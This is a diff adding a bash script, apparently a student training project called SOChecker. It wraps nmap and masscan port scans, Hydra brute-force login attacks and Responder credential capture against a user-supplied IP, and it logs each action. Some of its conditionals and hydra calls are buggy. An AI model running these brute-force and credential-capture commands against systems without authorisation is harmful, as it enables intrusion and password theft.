@@ -1,0 +1,399 @@
+#This script is for checking any open ports in the given network and conduct attacks on it and save the results in a file and record actions in a log.
+#For logs, I have used this 
+#log=actions.log
+#	TIMESTAMP=`date "+%Y-%m-%d %H:%M:%S"`
+#	echo "$TIMESTAMP Action- <input action> <input file>" >>actions.log
+#it will be shown in YYYY-MM-DD HH:MM:SS Action- <action> <file/ip address>
+#"function" is a useful tool to store scripts and able to use it by calling the function name.
+
+function tools() #To update and upgrade the machine and to install neccessary tools needed for this project.
+{ 
+	LOA="nmap masscan"
+	sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install -y $LOA
+	
+	sleep 15
+}
+
+
+function main() #In this main, I have given the option to the user of what they want to do first. 
+				#"read mainopt" is telling the machine to read the variable given by the user.
+				#"mainoption" is telling the machine to go to "mainoption function" in the script.
+{
+	echo "Welcome to SOChecker. What would you like to do?
+		  a) Read Files/Logs
+		  b) Scan/Attack
+		  c) Exit"
+	read mainopt
+	mainoption
+	
+	
+}
+
+function mainoption() #From main to mainoption, the machine reads the variable in main and by using if script, it is able to do what the user wants.
+					  #In this case, either read files/logs, launch scans/attacks or exit from the script.
+{
+if [ $mainopt == a ] #in option a, the user will be given options to choose what files/logs the user want to read or go back to the main menu. 
+					 #the variables will be read as mainopt1 and will proceed to "function submainoption1"
+	then
+	
+	echo "Which Files/Logs would you like to read?
+		  a) Logs
+		  b) Files
+		  c) Main Menu"
+	read mainopt1
+	
+	submainoption1
+	
+	elif [ $mainopt == b ] #in option b, the user will be asked what ip address they want to attack/scan.
+						   #the user will be asked in the question below to scan or attack or go back to the main menu
+	then				   #the variable will be read as mainoption and will proceed to "function submainoption"
+	
+	echo "Which IP address would you like to Scan/Attack? "
+	read IP
+	
+	echo "What would you like to do? 
+	      a) Scan
+	      b) Attack
+	      c) Main Menu"
+	      
+	read mainoption
+	submainoption
+	
+	else #The third option will be put as else. Meaning if a or b was not choosen, then option c being the last option, will be choosen. 
+		 #The user will exit from this script as stated in option c
+	exit
+	
+	fi
+}
+
+function submainoption() #From mainoption to submainoption, the user is given Scan or Attack
+						 #If the user has choosen a, they would be given 2 types of scan. Either nmap or masscan. Or they can choose to go back to main menu.
+{						 #The variable will be read as submainopt and will proceed to "function subscan"
+	if [ $mainoption == a ]
+	then 
+	echo " What type of scan would you like?
+			a) Nmap
+			b) Masscan
+			c) Main Menu"
+	read submainopt
+	subscan
+	
+	
+	
+	elif [ $mainoption == b ] #If the user has choosen b, the user will be given 2 types of attacks, hydra or responder or go back to main menu.
+							  #The variable will be read as submainopt1 and will proceed to "function subattack"
+	then 
+	echo " What type of attack would you like?
+		  a) Hydra
+		  b) Responder
+		  c) Main Menu"
+	read submainopt1
+	subattack
+	
+	
+	else
+	main
+	
+	fi
+}
+
+function submainoption1() #From mainoption to submainoption1, the user is given Files or Log.
+						  #If the user has choosen a, they will be able to read the log of actions made by the user using this script.
+						  #If the user has choosen b, then they will be given 2 type of files to read, a scan file or attack file, or go back to main menu.
+						  #The variable will be read as fileopt and will proceed to "function subfile"
+						  #If they have choosen the third option, it will be given else, as not a or b is choosen and will return to main menu
+{
+	if [ $mainopt1 == b ]
+	then 
+	echo "What files would you like to read?
+		  a) Scan Files
+		  b) Attack Files
+		  c) Main Menu"
+		  
+	read fileopt
+	subfile
+	
+	elif [ $mainopt1 == a ]
+	then cat SOChecker.log
+	sleep 5
+	
+	main
+	
+	else
+	main
+	fi
+	
+}
+	
+function subfile() #From submainoption1 to subfiles, the user is given 2types of files to read Scan file or Attack file.
+						  #If the user has choosen a, they will be able to read the scan files done by this script.
+						  #If the user has choosen b, then they will be able to read the attack files done by this script.
+						  #If they have choosen the third option, it will be given else, as not a or b is choosen and will return to main menu
+{
+if [ $fileopt == a ] #The variable for this option will be stored as filescan and will proceed to "function subfilescan"
+	then 
+	echo "which Scan Files would you like to read?
+		  a) Nmap
+		  b) Masscan
+		  c) Main Menu"
+	read filescan
+	subfilescan
+	
+	elif [ $fileopt == b ] #The variable for this option will be stored as fileattack and will proceed to "function subfileattack"
+	then 
+	echo "Which Attack Files would you like to read?
+		  a) Hydra
+		  b) Responder
+		  c) Main Menu"
+	read fileattack
+	subfileattack
+	
+	else 
+	main
+	fi
+}
+
+function subfilescan() #From subfile to subfilescan, the user is given 2 types of Scan File to read. Nmap scan and Masscan scans.
+					   #The actions of the user will be recorded in the actions.log in this step before displaying what is in the scan.
+					   #Or else the user will go back to main menu.
+{
+	if [ $filescan == a ] #This scan is from nmap scan. After displaying the scan, the user will be brought back to main menu.
+	then 
+	
+	TIMESTAMP=`date "+%Y-%m-%d %H:%M:%S"`
+	echo "$TIMESTAMP Action- READ n.scan" >>SOChecker.log
+	cat n.scan
+	
+	sleep 5
+	
+	main
+	elif [ $filescan == b ] #this scan is from masscan scan. After displaying the scan, the user will be brought back to the main menu.
+	then 
+	
+	TIMESTAMP=`date "+%Y-%m-%d %H:%M:%S"`
+	echo "$TIMESTAMP Action- READ m.scan" >>SOChecker.log
+	cat m.scan 
+	
+	sleep 5
+	
+	main
+	else
+	main
+	fi
+}
+
+function subfileattack() #From subfile to subfileattack, the user is given 2 types of Attack files to read. Hydra attack and responder attack.
+						 #The actions of the user will be recorded in the actions.log in this step before displaying what is in the scan.
+					   #Or else the user will go back to main menu.
+{
+	if [ $fileattack == a ] #This file is from hydra attack, and will go back to main menu after displaying the file
+	then
+	
+	TIMESTAMP=`date "+%Y-%m-%d %H:%M:%S"`
+	echo "$TIMESTAMP Action- READ hydra.txt" >> SOChecker.log
+	cat hydra.txt
+	
+	sleep 5
+	main
+	
+	elif [ $fileattack == b ] #This file is from responder attack, and will go back to main menu after displaying the file
+	then
+	
+	TIMESTAMP=`date "+%Y-%m-%d %H:%M:%S"`
+	echo "$TIMESTAMP Action- READ Responder-Session.log" >>SOChecker.log
+	cat /usr/share/responder/logs/Responder-Session.log #Any credentials found during the attack will be stored in /usr/share/responder/logs/Responder-Session.log
+	
+	sleep 5
+	main
+	
+	else
+	main
+	fi
+}
+
+
+
+function subscan()	#From suboption to subscan, the user is given 2 types of scans, Nmap and Masscan.
+					#The actions of the user will be recorded in the actions.log in this step before proceeding to scan.
+					   #Or else the user will go back to main menu.
+{
+if [ $submainopt == a ] #This option lets the user to use Nmap. The user's action will be recorded before proceeding to "function scan1"
+	then 
+	
+	TIMESTAMP=`date "+%Y-%m-%d %H:%M:%S"`
+	echo "$TIMESTAMP Action- SCAN nmap $IP" >>SOChecker.log
+	
+	scan1
+	
+	
+	elif [$submainopt == b ] #This option lets the user to use Masscan. The user's action will be recorded before proceeding to "function scan2"
+	then
+	
+	TIMESTAMP=`date "+%Y-%m-%d %H:%M:%S"`
+	echo "$TIMESTAMP Action- SCAN masscan $IP" >> SOChecker.log
+	
+	scan2
+	
+	else
+	main
+	fi
+}
+
+
+function subattack() #From suboption to subattack, the user is given 2 types of attack, Hydra and Responder.
+					#The actions of the user will be recorded in the actions.log in this step before proceeding to attack.
+					   #Or else the user will go back to main menu.
+{
+	
+if [ $submainopt1 == a ] #This option lets the user to use Hydra. The user's action will be recorded before proceeding to "function attack1"
+	then 
+	
+	TIMESTAMP=`date "+%Y-%m-%d %H:%M:%S"`
+	echo "$TIMESTAMP Action- ATTACK hydra $IP" >> SOChecker.log
+	attack1
+	
+	elif [ $submainopt1 == b ] #This option lets the user to use Responder. The user's action will be recorded before proceeding to "function attack2"
+	then
+	
+	TIMESTAMP=`date "+%Y-%m-%d %H:%M:%S"`
+	echo "$TIMESTAMP Action- ATTACK responder eth0" >> SOChecker.log
+	attack2
+	
+	else
+	main
+	fi
+}
+
+function scan1() #from subscan to scan1, the user uses nmap to scan the ports open on that IP address. It will save the scan to 'n.scan' After the scan, the user will be back to the main menu.
+				 #$IP comes from the variable gotten from "function mainoption" when the script asked for "which IP address do you want to Scan/Attack?".
+{
+	
+	#-sV flag means to try to find out which services are running, -Pn flag means to bypass discovery and proceed to port scanning directly. And -oN flag means normal output to the file
+	
+	sudo nmap $IP -sV -Pn -oN n.scan
+	sleep 5
+	
+	main
+}
+
+function scan2() #from subscan to scan2, the user uses masscan to scan the ports open on that IP address. it will save the scan and proceed to main menu after its done.
+				 #$IP comes from the variable gotten from "function mainoption" when the script asked for "which IP address do you want to Scan/Attack?".
+{
+	#This scan 2 uses masscan to scan any open ports in that IP address. It will save the scan to 'm.scan'
+	#-p0-65535 means scanning ports from 0-65535. And -oL means output to simple list format
+	sudo masscan $IP -p0-65535 -oL m.scan
+	
+	sleep 5
+	
+	main
+}
+
+function attack1() #From subattack to attack1, the user uses Hydra to attack. it will save the attack as hydra.txt.
+				   #$IP comes from the variable gotten from "function mainoption" when the script asked for "which IP address do you want to Scan/Attack?".
+{
+	
+	#Hydra is a brute force attack on the victim system by trying each usernames and passwords to gain access. And it will save it as hydra.txt
+	
+	echo "Please refer to scans for attack. If you are unsure of the services or ports please select 'n', and will bring you back to main menu for your scans"
+	echo "Do you know which services to attack? (y/n) "
+	read sv
+	if [ $sv == y ]
+	then
+	echo "For Hydra, please insert the service you wish to attack (ie ssh/ftp): " #Here you input the kind of services you want to attack, and the variable will be stored as svc
+	read svc
+	elif [ $sv == n ]
+	then
+	main
+	fi
+	
+	echo "Do you know which port to attack? (y/n) "
+	read sv1
+	if [ $sv1 == y ]
+	then
+	echo "For Hydra, please insert the port you wish to attack (if unsure, please refer to the scans): " #Here you input the port you want to attack. the variables will be saved as port.
+	read port
+	elif [ $sv == n ]
+	then
+	main 
+	fi
+	
+	echo "Do you have a list of usernames? y/n?" 
+	read choices
+	
+	if [  $choices == y  ]
+	then
+		echo "please input file name: (Please ensure file is in the same directory)"
+		read filename
+	elif [ $choices == n ]
+	then
+		echo "please input username to attack: "
+		read name
+	fi
+	
+	echo "Do you have a list of passwords? y/n?"
+	read option
+	
+	if [  $option == y  ]
+	then 
+		echo "Please input file name: (Please ensure file is in the same directory)"
+		read passfile
+	elif [  $option == n  ]
+	then 
+		echo "Please input password you wish to try: "
+		read pass
+	fi
+	
+	if [ $choices == y ] && [ $option == y ] #This is a nested ifs statement. If the first condition is met, it will proceed with then.
+											 # If the first condition is not met, it will proceed with else and proceed with the next if statement. 
+											 #The process will carry on until the conditions are met.
+	
+	then
+		sudo hydra -L $filename -P $passfile $IP $svc -s $port -c 5 -vV -e nsr -o hydra.txt
+		
+	else
+		if [  $choices == n ] && [ $option == n ]
+		then 
+		sudo hydra -l $name -p $pass $IP $svc -s $port -c 5 -vV -e nsr -o hydra.txt
+		
+		else
+	
+			if [ $choices == y ] && [ $option == n ]
+			then 
+			sudo hydra -L $filename -p $pass $IP $svc $port -c 5 -vV -e nsr -o hydra.txt
+		
+			else
+				if [ $choices == n ] && [ $option == y ]
+				then 
+				sudo hydra -l $name -P $passfile $IP $svc $port -c 5 -vV -e nsr -o hydra.txt
+				fi
+			fi
+		fi
+	fi
+	
+	sleep 5
+	main
+}
+
+function attack2()
+{
+	# For attack 2, I'm going to use responder. It is a power tool for quickly gaining credentials. 
+	 echo "The files for this result can also be found in /usr/share/responder/logs"
+	
+	sleep 5 
+	
+	sudo responder -I eth0
+	sleep 5
+	
+	main
+}
+
+echo "Do you have nmap/masscan installed? (y/n) "
+read install
+if [ $$install == n ]
+then
+tools
+main
+elif [ $install == y ]
+then 
+main
+fi
